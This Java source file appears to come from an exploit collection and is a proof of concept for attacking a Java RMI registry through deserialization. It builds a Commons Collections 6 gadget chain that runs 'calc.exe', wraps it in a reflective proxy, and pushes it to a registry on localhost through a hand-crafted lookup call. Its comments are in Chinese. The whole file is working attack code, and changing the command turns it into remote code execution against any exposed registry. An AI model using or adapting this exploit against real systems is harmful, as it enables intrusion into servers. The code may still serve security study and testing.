package org.payload.rmi.rmiRegistry.ToRegistry;

import sun.rmi.server.UnicastRef;
import java.io.ObjectOutput;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.util.Map;

import static org.payload.cc.CC6.CommonsCollections6TemplatesImpl.CommonsCollections6TemplatesImpl;

public class ClientToRegistry {
    public static void main(String[] args) throws Exception {

        Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);

        Object seri = CommonsCollections6TemplatesImpl("calc.exe");
        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, seri);

        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject));

        LocateRegistry.createRegistry(1091);
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1091);

        // 获取super.ref
        Field[] fields_0 = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredFields();
        fields_0[0].setAccessible(true);
        UnicastRef ref = (UnicastRef) fields_0[0].get(registry_remote);

        // 获取operations
        Field[] fields_1 = registry_remote.getClass().getDeclaredFields();
        fields_1[0].setAccessible(true);
        Operation[] operations = (Operation[]) fields_1[0].get(registry_remote);

        // 跟lookup方法一样的传值过程
        RemoteCall var2 = ref.newCall((RemoteObject) registry_remote, operations, 2, 4905912898345647071L);
        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(proxyEvalObject);
        ref.invoke(var2);
    }
}